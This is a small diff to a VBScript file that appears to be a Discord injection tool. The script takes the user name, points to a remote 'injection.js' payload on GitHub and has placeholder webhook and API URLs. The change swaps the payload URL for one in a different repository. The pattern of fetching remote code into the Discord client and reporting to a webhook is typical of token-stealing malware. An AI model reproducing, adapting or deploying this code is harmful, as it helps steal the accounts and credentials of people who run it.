@@ -5,7 +5,7 @@ Dim userName, localAppDataPath
 
 userName = CreateObject("WScript.Network").UserName
 
-injection_url = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"
+injection_url = "https://raw.githubusercontent.com/vknguser/sr02/refs/heads/main/injection.js"
 
 webhook_url = "replace_webhook_url"
 api_url = "replace_api_url"
